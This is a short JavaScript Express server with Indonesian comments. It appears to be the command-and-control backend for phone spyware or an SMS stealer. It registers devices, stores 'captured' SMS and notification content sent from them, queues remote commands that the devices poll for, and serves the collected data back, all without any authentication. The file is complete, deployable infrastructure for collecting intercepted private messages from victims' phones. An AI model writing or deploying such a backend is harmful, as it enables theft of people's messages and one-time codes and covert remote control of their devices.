import express from 'express';
import { kv } from '@vercel/kv';

const app = express();
app.use(express.json({ limit: '2mb' }));

// Helper untuk ambil device_id dari query/body
function getDeviceId(req) {
  return req.query.device_id || req.body.device_id;
}

// Endpoint untuk register perangkat
app.post('/api/register', async (req, res) => {
  const { device_id, info } = req.body;
  if (!device_id) return res.status(400).json({ error: 'device_id required' });
  await kv.set(`device:${device_id}`, info);
  await kv.sadd('devices', device_id);
  res.json({ success: true });
});

// Endpoint untuk menerima data (SMS, notifikasi, dll)
app.post('/api/capture', async (req, res) => {
  const { type, content, device_id, timestamp } = req.body;
  if (!device_id) return res.status(400).json({ error: 'device_id required' });
  const key = `data:${device_id}:${timestamp || Date.now()}`;
  await kv.set(key, { type, content, device_id, timestamp: timestamp || Date.now() });
  res.json({ success: true });
});

// Ambil daftar perangkat
app.get('/api/devices', async (req, res) => {
  const deviceIds = await kv.smembers('devices');
  const devices = [];
  for (const id of deviceIds) {
    const info = await kv.get(`device:${id}`);
    devices.push({ device_id: id, info });
  }
  res.json({ devices });
});

// Kirim perintah ke perangkat
app.post('/api/command', async (req, res) => {
  const { device_id, command, params } = req.body;
  if (!device_id || !command) return res.status(400).json({ error: 'device_id and command required' });
  const commandId = Date.now();
  await kv.set(`command:${device_id}:${commandId}`, { command, params });
  await kv.expire(`command:${device_id}:${commandId}`, 60); // auto hapus 60 detik
  res.json({ success: true, command_id: commandId });
});

// Perangkat polling perintah
app.get('/api/poll', async (req, res) => {
  const device_id = getDeviceId(req);
  if (!device_id) return res.status(400).json({ error: 'device_id required' });
  const keys = await kv.keys(`command:${device_id}:*`);
  const commands = [];
  for (const key of keys) {
    const cmd = await kv.get(key);
    if (cmd) {
      commands.push({
        command_id: key.split(':')[2],
        command: cmd.command,
        params: cmd.params
      });
      await kv.del(key);
    }
  }
  res.json({ commands });
});

// Ambil data terakhir perangkat
app.get('/api/data', async (req, res) => {
  const device_id = getDeviceId(req);
  if (!device_id) return res.status(400).json({ error: 'device_id required' });
  const keys = await kv.keys(`data:${device_id}:*`);
  const data = [];
  for (const key of keys) {
    const item = await kv.get(key);
    if (item) data.push(item);
  }
  data.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
  res.json({ data: data.slice(0, 100) });
});

export default app;
